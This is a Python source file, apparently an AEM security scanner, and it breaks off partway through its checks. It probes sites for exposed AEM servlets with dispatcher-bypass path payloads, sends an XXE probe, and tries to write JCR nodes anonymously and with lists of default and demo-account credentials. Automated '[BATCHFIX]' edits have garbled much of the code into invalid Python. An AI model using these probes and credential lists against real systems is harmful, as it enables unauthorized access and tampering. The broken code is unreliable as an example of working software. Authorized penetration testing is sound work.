#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");"# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,"# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# limitations under the License.

import concurrent.futures
import itertools
import json
import datetime
import traceback
import sys
import argparse
import base64
import time
from collections import namedtuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import choice, randint
from string import ascii_letters
from threading import Thread

import requests

requests.packages.urllib3.disable_warnings()


# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""# CREDS = (
    "admin:admin","    "author:author","    "grios:password","    "replication-receiver:replication-receiver","    "vgnadmin:vgnadmin","    "aparker@geometrixx.info:aparker","    "jdoe@geometrixx.info:jdoe","    "james.devore@spambob.com:password","    "matt.monroe@mailinator.com:password","    "aaron.mcdonald@mailinator.com:password","    "jason.werner@dodgit.com:password",")


def random_string(length=10):
# [BATCHFIX] Commented metadata/non-Python
#     return ".join([choice(ascii_letters) for _ in range(length)])"  # [BATCHFIX] closed string"

registered = {}  # Registered checks
token = random_string()  # Token to recognize SSRF was triggered
d = {}  # store SSRF detections
extra_headers = {}


class Detector(BaseHTTPRequestHandler):
    def __init__(self, token, d, *args):
        self.d = d
        self.token = token
        BaseHTTPRequestHandler.__init__(self, *args)

    def log_message(self, format, *args):
        return

    def do_GET(self):
        self.serve()

    def do_POST(self):
        self.serve()

    def do_PUT(self):
        self.serve()

    def serve(self):
        try:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""             token, key, value = self.path.split("/")[1:4]"        except Exception:
            self.send_response(200)
            return

        if self.token != token:
            self.send_response(200)
            return

        if key in self.d:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""             self.d[key].append(value)""""        else:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""             self.d[key] = [""""                value,
            ]

        self.send_response(200)


def register(name):
    def decorator(func):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         registered[name] = func""""        return func

    return decorator


Finding = namedtuple("Finding", "name, url, description")"

def normalize_url(base_url, path):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     if base_url[-1] == "/" and (path[0] == "/" or path[0] == "\\"):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         url = base_url[:-1] + path""""    else:
        url = base_url + path

    return url


def content_type(ct):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     return ct.split(";")[0].lower().strip()"

def error(message, **kwargs):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     print("[{}] {}".format(datetime.datetime.now().time(), message), sys.stderr)"    for n, a in kwargs.items():
        print("\\t{}={}".format(n, a), sys.stderr)"
    exc_type, exc_value, exc_traceback = sys.exc_info()
    print("Exception type:" + str(exc_type), sys.stderr)"    print("Exception value:" + str(exc_value), sys.stderr)"    print("TRACE:", sys.stderr)"    traceback.print_tb(exc_traceback, file=sys.stderr)
    print("\\n\\n\\n", sys.stderr)"

def http_request(url, method="GET", data=None, additional_headers=None, proxy=None, debug=False):"    pass  # [BATCHFIX] inserted for empty block

    with requests.Session() as session:
        headers = {"User-Agent": "curl/7.30.0"}"        if additional_headers:
            headers.update(additional_headers)
        if extra_headers:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#             headers.update(
                {
                    # Retrieve the headers configured as extra headers but not controlled
                    # by the application in this specific request
                    h_name: h_value
                    for h_name, h_value in extra_headers.items()
                    if h_name not in headers
                }
            )

        if not proxy:
            proxy = {}

        if debug:
            print(">> Sending {} {}".format(method, url))"
        session.get(url, verify=False, timeout=40, allow_redirects=False)
        if method == "GET":"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#             resp = session.get(
                url, data=data, headers=headers, proxies=proxy, verify=False, timeout=40, allow_redirects=False
            )
        elif method == "POST":"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#             resp = session.post(
                url, data=data, headers=headers, proxies=proxy, verify=False, timeout=40, allow_redirects=False
            )
        else:
# [BATCHFIX] Commented metadata/non-Python
#             print(fUNHANDLED METHOD {method}")"  # [BATCHFIX] closed string"
        if debug:
            print("<< Received HTTP-{}", resp.status_code)"
    return resp


def http_request_multipart(url, method="POST", data=None, additional_headers=None, proxy=None, debug=False):"    headers = {"User-Agent": "curl/7.30.0"}"    if additional_headers:
        headers.update(additional_headers)
    if extra_headers:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         headers.update(
            {
                # Retrieve the headers configured as extra headers but not controlled
                # by the application in this specific request
                h_name: h_value
                for h_name, h_value in extra_headers.items()
                if h_name not in headers
            }
        )

    if not proxy:
        proxy = {}

    if debug:
        print(">> Sending {} {}".format(method, url))"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     resp = requests.request(
        method, url, files=data, headers=headers, proxies=proxy, verify=False, timeout=40, allow_redirects=False
    )

    if debug:
        print("<< Received HTTP-{}", resp.status_code)"
    return resp


def preflight(url, proxy=None, debug=False):
    try:
        http_request(url, proxy=proxy, debug=debug)
    except Exception:
        return False
    else:
        return True


@register("set_preferences")"def exposed_set_preferences(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SETPREFERENCES = itertools.product(
        ("/crx/de/setPreferences.jsp", "///crx///de///setPreferences.jsp"),"        (";%0a{0}.html", "/{0}.html"),"        ("?keymap=<1337>&language=0",),"    )
    SETPREFERENCES = list("{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in SETPREFERENCES)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
    for path in SETPREFERENCES:
        url = normalize_url(base_url, path)

        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 400:
                if "<1337>" in resp.content.decode():"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                     f = Finding(
                        "SetPreferences","                        url,
                        "Page setPreferences.jsp is exposed, XSS might be possible via keymap parameter.","                    )

                    results.append(f)
                    break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_set_preferences", url=url)"
    return results


@register("merge_metadata")"def exposed_merge_metadata(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     MERGEMETADATA = itertools.product(
        ("/libs/dam/merge/metadata", "///libs///dam///merge///metadata"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".html","            ".css/{0}.html","            ".ico/{0}.html","            "....4.2.1....json/{0}.html","            ".css;%0a{0}.html","            ".ico;%0a{0}.html","        ),
        ("?path=/etc&.ico",),"    )
    MERGEMETADATA = list("{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in MERGEMETADATA)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
    for path in MERGEMETADATA:
        url = normalize_url(base_url, path)

        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""                     json.loads(resp.content.decode())["assetPaths"]"                except Exception:
                    pass
                else:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                     f = Finding(
                        "MergeMetadataServlet","                        url,
                        "MergeMetadataServlet is exposed, XSS might be possible via path parameter.","                    )

                    results.append(f)
                    break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_merge_metadata", url=url)"
    return results


@register("get_servlet")"def exposed_get_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     GETSERVLET = itertools.product(
        ("/", "/etc", "/var", "/apps", "/home", "///etc", "///var", "///apps", "///home"),"# [BATCHFIX] Commented metadata/non-Python
#         (", ".children"),"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".1.json","            "....4.2.1....json","            ".json?{0}.css","            ".json?{0}.ico","            ".json?{0}.html","            ".json/{0}.css","            ".json/{0}.html","            ".json/{0}.png","            ".json/{0}.ico","            ".json;%0a{0}.css","            ".json;%0a{0}.png","            ".json;%0a{0}.html","            ".json;%0a{0}.ico","        ),
    )
    GETSERVLET = list("{0}{1}{2}".format(p1, p2, p3.format(r)) for p1, p2, p3 in GETSERVLET)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
    for path in GETSERVLET:
        url = normalize_url(base_url, path)

        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
                    json.loads(resp.content.decode())
                    if "jcr:primaryType" not in resp.content.decode():"                        raise Exception()
                except Exception:
                    pass
                else:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                     f = Finding(
                        "DefaultGetServlet","                        url,
#                         "Sensitive information might be exposed via AEM's DefaultGetServlet."  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
"""                         "Check child nodes manually for secrets exposed, see -"  # [BATCHFIX] closed string"                        "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=43","                    )

                    results.append(f)
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_get_servlet", url=url)"
    return results


@register("querybuilder_servlet")"def exposed_querybuilder_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     QUERYBUILDER = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/bin/querybuilder.json","            "///bin///querybuilder.json","            "/bin/querybuilder.feed","            "///bin///querybuilder.feed","        ),
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unterminated string""""#             ","  # [BATCHFIX] closed string"            ".css","            ".ico","            ".png","            ".gif","            ".html","            ".1.json","            "....4.2.1....json","            ";%0a{0}.css","            ";%0a{0}.png","            ";%0a{0}.html","            ";%0a{0}.ico","            ".ico;%0a{0}.ico","            ".css;%0a{0}.css","            ".html;%0a{0}.html","            "?{0}.css","            "?{0}.ico","        ),
    )
    QUERYBUILDER = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in QUERYBUILDER)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    found_json = False
    found_feed = False
    for path in QUERYBUILDER:
        if found_feed and found_json:
            break

        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""                     json.loads(resp.content.decode())["hits"]"                except Exception:
                    pass
                else:
                    if found_json:
                        continue

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                     f = Finding(
                        "QueryBuilderJsonServlet","                        url,
#                         "Sensitive information might be exposed via AEM's QueryBuilderJsonServlet."  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
"""                         "See - https://helpx.adobe.com/experience-manager/6-3/sites/developing/"  # [BATCHFIX] closed string"                        "using/querybuilder-predicate-reference.html","                    )

                    results.append(f)
                    found_json = True

                if "</feed>" in str(resp.content):"                    if found_feed:
                        continue

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                     f = Finding(
                        "QueryBuilderFeedServlet","                        url,
#                         "Sensitive information might be exposed via AEM's QueryBuilderFeedServlet."  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
"""                         "See - https://helpx.adobe.com/experience-manager/6-3/sites/developing/"  # [BATCHFIX] closed string"                        "using/querybuilder-predicate-reference.html","                    )

                    results.append(f)
                    found_feed = True
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_querybuilder_servlet", url=url)"
    return results


@register("gql_servlet")"def exposed_gql_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     GQLSERVLET = itertools.product(
        ("/bin/wcm/search/gql", "///bin///wcm///search///gql"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            "....1....json","            ".json/{0}.css","            ".json/{0}.html","            ".json/{0}.ico","            ".json/{0}.png","            ".json;%0a{0}.css","            ".json;%0a{0}.ico","            ".json;%0a{0}.html","            ".json;%0a{0}.png","        ),
        ("?query=type:User%20limit:..1&pathPrefix=&p.ico",),"    )
    GQLSERVLET = list("{0}{1}{2}".format(p1, p2.format(r), p3) for p1, p2, p3 in GQLSERVLET)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in GQLSERVLET:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""                     json.loads(resp.content.decode())["hits"]"                except Exception:
                    pass
                else:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                     f = Finding(
                        "GQLServlet","                        url,
#                         "Sensitive information might be exposed via AEM's GQLServlet. See -"  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
"""                         "https://helpx.adobe.com/experience-manager/6-3/sites/developing/using/"  # [BATCHFIX] closed string"                        "reference-materials/javadoc/index.html?org/apache/jackrabbit/commons/query/GQL.html","                    )

                    results.append(f)
                    break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_gql_servlet", url=url)"
    return results


@register("guide_internal_submit_servlet")"def exposed_guide_internal_submit_servlet_xxe(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     GuideInternalSubmitServlet = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/content/forms/af/geometrixx-gov/application-for-assistance/jcr:content/guideContainer","            "/content/forms/af/geometrixx-gov/geometrixx-survey-form/jcr:content/guideContainer","            "/content/forms/af/geometrixx-gov/hardship-determination/jcr:content/guideContainer","            "/libs/fd/af/components/guideContainer/cq:template","            "///libs///fd///af///components///guideContainer///cq:template","            "/libs/fd/af/templates/simpleEnrollmentTemplate2/jcr:content/guideContainer","            "///libs///fd///af///templates///simpleEnrollmentTemplate2///jcr:content///guideContainer","            "/libs/fd/af/templates/surveyTemplate2/jcr:content/guideContainer","            "///libs///fd///af///templates///surveyTemplate2///jcr:content///guideContainer","            "/libs/fd/af/templates/blankTemplate2/jcr:content/guideContainer","            "///libs///fd///af///templates///blankTemplate2///jcr:content///guideContainer","            "/libs/fd/af/templates/surveyTemplate/jcr:content/guideContainer","            "/libs/fd/af/templates/surveyTemplate/jcr:content/guideContainer","            "///libs///fd///af///templates///surveyTemplate///jcr:content///guideContainer","            "/libs/fd/af/templates/tabbedEnrollmentTemplate/jcr:content/guideContainer","            "///libs///fd///af///templates///tabbedEnrollmentTemplate///jcr:content///guideContainer","            "/libs/fd/af/templates/tabbedEnrollmentTemplate2/jcr:content/guideContainer","            "///libs///fd///af///templates///tabbedEnrollmentTemplate2///jcr:content///guideContainer","            "/libs/fd/af/templates/simpleEnrollmentTemplate/jcr:content/guideContainer","            "///libs///fd///af///templates///simpleEnrollmentTemplate///jcr:content///guideContainer","            "/libs/settings/wcm/template-types/afpage/initial/jcr:content/guideContainer","            "///libs///settings///wcm///template-types///afpage///initial///jcr:content///guideContainer","            "/libs/settings/wcm/template-types/afpage/structure/jcr:content/guideContainer","            "///libs///settings///wcm///template-types///afpage///structure///jcr:content///guideContainer","            "/apps/geometrixx-gov/templates/enrollment-template/jcr:content/guideContainer","            "/apps/geometrixx-gov/templates/survey-template/jcr:content/guideContainer","            "/apps/geometrixx-gov/templates/tabbed-enrollment-template/jcr:content/guideContainer","        ),
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".af.internalsubmit.json","            ".af.internalsubmit.1.json","            ".af.internalsubmit...1...json","            ".af.internalsubmit.html","            ".af.internalsubmit.js","            ".af.internalsubmit.css","            ".af.internalsubmit.ico","            ".af.internalsubmit.png","            ".af.internalsubmit.gif","            ".af.internalsubmit.svg","            ".af.internalsubmit.ico;%0a{0}.ico","            ".af.internalsubmit.html;%0a{0}.html","            ".af.internalsubmit.css;%0a{0}.css","        ),
    )
    GuideInternalSubmitServlet = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in GuideInternalSubmitServlet)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in GuideInternalSubmitServlet:
        url = normalize_url(base_url, path)
        try:
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#             data = (
                'guideState={"guideState"%3a{"guideDom"%3a{},"guideContext"%3a{"xsdRef"%3a",'"'                '"guidePrefillXml"%3a"<afData>\\u0041\\u0042\\u0043</afData>"}}}'"'            )
            headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": base_url}"            resp = http_request(url, "POST", data=data, additional_headers=headers, proxy=proxy)"
            if resp.status_code == 200 and "<afData>ABC" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
# [BATCHFIX] Commented metadata/non-Python
"""                     "GuideInternalSubmitServlet", url, "GuideInternalSubmitServlet is exposed, XXE is possible."  # [BATCHFIX] closed string"                )
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_guide_internal_submit_servlet_xxe", url=url)"
    return results


@register("post_servlet")"def exposed_post_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     POSTSERVLET = itertools.product(
        ("/", "/content", "/content/dam"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".1.json","            "...4.2.1...json","            ".json/{0}.css","            ".json/{0}.html","            ".json;%0a{0}.css","            ".json;%0a{0}.html","        ),
    )
    POSTSERVLET = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in POSTSERVLET)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in POSTSERVLET:
        url = normalize_url(base_url, path)
        try:
# [BATCHFIX] Commented metadata/non-Python
"""             data = ":operation=nop"  # [BATCHFIX] closed string"            headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": base_url}"            resp = http_request(url, "POST", data=data, additional_headers=headers, proxy=proxy, debug=debug)"
            if resp.status_code == 200 and "Null Operation Status:" in str(resp.content):"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "POSTServlet","                    url,
                    "POSTServlet is exposed, persistent XSS or RCE might be possible, it depends on your privileges.","                )
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="exposed_post_servlet", url=url)"
    return results


@register("create_new_nodes")"def create_new_nodes(base_url, my_host, debug=False, proxy=None):
    creds_list = ("admin:admin", "author:author")"
    nodename1 = random_string()
    r1 = random_string(3)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     POSTSERVLET1 = itertools.product(
        ("/content/usergenerated/etc/commerce/smartlists/", "/content/usergenerated/"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "*","            "{0}.json","            "{0}.1.json","            "{0}.json/{1}.css","            "{0}.json/{1}.html","            "{0}.json/{1}.ico","            "{0}.json/{1}.png","            "{0}.json/{1}.1.json","            "{0}.json;%0a{1}.css","            "{0}.json;%0a{1}.html","            "{0}.json;%0a{1}.png","            "{0}.json;%0a{1}.ico","            "{0}....4.2.1....json","            "{0}?{1}.ico","            "{0}?{1}.css","            "{0}?{1}.html","            "{0}?{1}.json","            "{0}?{1}.1.json","            "{0}?{1}....4.2.1....json","        ),
    )
    POSTSERVLET1 = list("{0}{1}".format(p1, p2.format(nodename1, r1)) for p1, p2 in POSTSERVLET1)"
    nodename2 = random_string()
    r2 = random_string(3)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     POSTSERVLET2 = itertools.product(
        ("/", "/content/", "/apps/", "/libs/"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "*","            "{0}.json","            "{0}.1.json","            "{0}.json/{1}.css","            "{0}.json/{1}.html","            "{0}.json/{1}.ico","            "{0}.json/{1}.png","            "{0}.json/{1}.1.json","            "{0}.json;%0a{1}.css","            "{0}.json;%0a{1}.html","            "{0}.json;%0a{1}.png","            "{0}.json;%0a{1}.ico","            "{0}....4.2.1....json","            "{0}?{1}.ico","            "{0}?{1}.css","            "{0}?{1}.html","            "{0}?{1}.json","            "{0}?{1}.1.json","            "{0}?{1}....4.2.1....json","        ),
    )
    POSTSERVLET2 = list("{0}{1}".format(p1, p2.format(nodename2, r2)) for p1, p2 in POSTSERVLET2)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path in POSTSERVLET1:
        url = normalize_url(base_url, path)
        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": base_url}"            resp = http_request(url, "POST", additional_headers=headers, proxy=proxy)"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""             if "<td>Parent Location</td>" in str(resp.content) and resp.status_code in [200, 201]:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "CreateJCRNodes","                    url,
#                     "It's possible to create new JCR nodes using POST Servlet as anonymous user."  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
"""                     "You might get persistent XSS or perform other attack by accessing"  # [BATCHFIX] closed string"                    "servlets registered by Resource Type.","                )
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="create_new_nodes", url=url)"
    for path, creds in itertools.product(POSTSERVLET2, creds_list):
        url = normalize_url(base_url, path)
        try:
            auth_val = base64.b64encode(creds.encode()).decode()
            headers = {
                "Content-Type": "application/x-www-form-urlencoded","                "Referer": base_url,"                "Authorization": "Basic {}".format(auth_val),"            }
# [BATCHFIX] Commented metadata/non-Python
"""             data = "a=b"  # [BATCHFIX] closed string"            resp = http_request(url, "POST", data=data, additional_headers=headers, proxy=proxy)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""             if "<td>Parent Location</td>" in str(resp.content) and resp.status_code in [200, 201]:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "CreateJCRNodes","                    url,
                    'It\'s possible to create new JCR nodes using POST Servlet as "{0}" user. '"'                    "You might get persistent XSS or RCE.".format(creds),"                )
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="create_new_nodes", url=url)"
    return results


@register("create_new_nodes2")"def create_new_nodes2(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     creds_list = (
        "author:author","        "grios:password","        "aparker@geometrixx.info:aparker","        "jdoe@geometrixx.info:jdoe","        "james.devore@spambob.com:password","        "matt.monroe@mailinator.com:password","        "aaron.mcdonald@mailinator.com:password","        "jason.werner@dodgit.com:password","    )

    nodename = random_string()
    r = random_string(3)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     POSTSERVLET = itertools.product(
        ("/home/users/geometrixx/{0}/",),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "*","            "{0}.json","            "{0}.1.json","            "{0}.json/{1}.css","            "{0}.json/{1}.html","            "{0}.json/{1}.ico","            "{0}.json/{1}.png","            "{0}.json/{1}.1.json","            "{0}.json;%0a{1}.css","            "{0}.json;%0a{1}.html","            "{0}.json;%0a{1}.png","            "{0}.json;%0a{1}.ico","            "{0}....4.2.1....json","            "{0}?{1}.ico","            "{0}?{1}.css","            "{0}?{1}.html","            "{0}?{1}.json","            "{0}?{1}.1.json","            "{0}?{1}....4.2.1....json","        ),
    )
    POSTSERVLET = list("{0}{1}".format(p1, p2.format(nodename, r)) for p1, p2 in POSTSERVLET)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""    for path, creds in itertools.product(POSTSERVLET, creds_list):
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         path = path.format(creds.split(":")[0])"        url = normalize_url(base_url, path)
        try:
            auth_val = base64.b64encode(creds.encode()).decode()
            headers = {
                "Content-Type": "application/x-www-form-urlencoded","                "Referer": base_url,"                "Authorization": "Basic {}".format(auth_val),"            }
# [BATCHFIX] Commented metadata/non-Python
"""             data = "a=b"  # [BATCHFIX] closed string"            resp = http_request(url, "POST", data=data, additional_headers=headers, proxy=proxy)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""             if "<td>Parent Location</td>" in str(resp.content) and resp.status_code in [200, 201]:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#                 f = Finding(
                    "CreateJCRNodes 2","                    url,
                    'It\'s possible to create new JCR nodes using POST Servlet. As Geometrixx user "{0}". '"'# [BATCHFIX] Commented metadata/non-Python
"""                     "You might get persistent XSS or perform other attack by accessing servlets"  # [BATCHFIX] closed string"                    "registered by Resource Type.".format(creds),"                )
                results.append(f)
                break
        except Exception:
            if debug:
                error("Exception while performing a check", check="create_new_nodes2", url=url)"
    return results


@register("loginstatus_servlet")"def exposed_loginstatus_servlet(base_url, my_host, debug=False, proxy=None):
    r = random_string(3)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     LOGINSTATUS = itertools.product(
        ("/system/sling/loginstatus", "///system///sling///loginstatus"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json","            ".css","            ".ico","            ".png","            ".gif","            ".html","            ".js","            ".json/{0}.1.json","            ".json;%0a{0}.css","            ".json;%0a{0}.html","            ".json;%0a{0}.png","            ".json;%0a{0}.ico","            "...4.2.1...json","        ),
    )
    LOGINSTATUS = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in LOGINSTATUS)"
# [BATCHFIX] Commented metadata/non-Python
